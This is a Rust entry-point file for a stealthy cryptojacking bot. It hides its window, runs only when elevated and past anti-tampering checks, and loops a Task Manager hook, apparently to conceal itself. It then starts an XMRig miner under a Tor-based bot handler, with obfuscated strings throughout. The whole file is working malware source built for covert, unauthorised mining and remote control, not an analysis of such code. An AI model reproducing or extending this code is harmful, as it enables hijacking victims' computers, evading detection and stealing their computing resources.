#![windows_subsystem = "windows"]

use std::{ sync::{ Arc, Mutex }, time::Duration };
use client_vars::constants::{ log_directory, xmrig_exe_name };
use miner::{ manager::MinerManager, utils::initialize_miner };
use network::{ basic::get_xmrig_summary, tor::BotHandler };
use obfstr::obfstr as s;
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    network::tor::LoggerCnfg,
    uac::checks::{ is_elevated, is_system },
    utils::{
        anti_tampering::is_clean,
        config::load_mib_config,
        functions::{ exit_1, get_current_exe_dir },
    },
};
use lazy_static::lazy_static;
use tasks::task_manager_hook::run_query_hooker;
use tokio::sync::RwLock;

mod tasks;
mod utils;
mod network;
mod miner;

#[tokio::main]
async fn main() {
    if !is_clean() {
        exit_1();
    }

    if !is_elevated().unwrap_or(false) {
        exit_1();
    }

    let mib_config = load_mib_config(false).unwrap();
    if !mib_config.cln_up_done {
        exit_1();
    }

    tokio::task::spawn(async move {
        loop {
            if let Err(error) = run_query_hooker().await {
                // println!("run_query_hooker errored out: {}", error);
            };
        }
    });

    // println!("Start");
    if let Ok(miner_manager) = MinerManager::new().await {
        if let Ok(mut bot_handler) = BotHandler::new(miner_manager).await {
            // println!("run");
            bot_handler.run_handler().await;
        }
    }
}
